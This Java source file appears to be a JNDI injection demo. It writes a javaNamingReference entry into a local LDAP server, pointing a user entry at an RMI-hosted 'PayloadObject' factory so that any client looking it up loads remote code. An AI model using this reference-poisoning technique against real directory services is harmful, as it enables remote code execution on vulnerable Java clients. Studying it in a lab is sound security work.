package jndidemo.ldap.Ref;

import javax.naming.Context;
import javax.naming.NamingException;
import javax.naming.directory.*;
import java.rmi.RemoteException;
import java.util.Hashtable;

public class LdapServerLocationData {
    public static void main(String[] args) throws NamingException, RemoteException {
        Hashtable env = new Hashtable();
        env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.ldap.LdapCtxFactory");
        env.put(Context.PROVIDER_URL,"ldap://127.0.0.1:1389");
        DirContext ctx =new InitialDirContext(env);
        Attribute mod1= new BasicAttribute("objectClass","top");
        mod1.add("javaNamingReference");
        Attribute mod2= new BasicAttribute("javaRemoteLocation","rmi://127.0.0.1:1099/refObj");
        Attribute mod3= new BasicAttribute("javaClassName","PayloadObject");
        Attribute mod4= new BasicAttribute("javaFactory","remoteclass.ExportObject");

        ModificationItem[] mods= new ModificationItem[]{
                new ModificationItem(DirContext.ADD_ATTRIBUTE,mod1),
                new ModificationItem(DirContext.ADD_ATTRIBUTE,mod2),
                new ModificationItem(DirContext.ADD_ATTRIBUTE,mod3),
                new ModificationItem(DirContext.ADD_ATTRIBUTE,mod4)
        };
        ctx.modifyAttributes("uid=longofo,ou=employees,dc=example,dc=com",mods);

    }
}
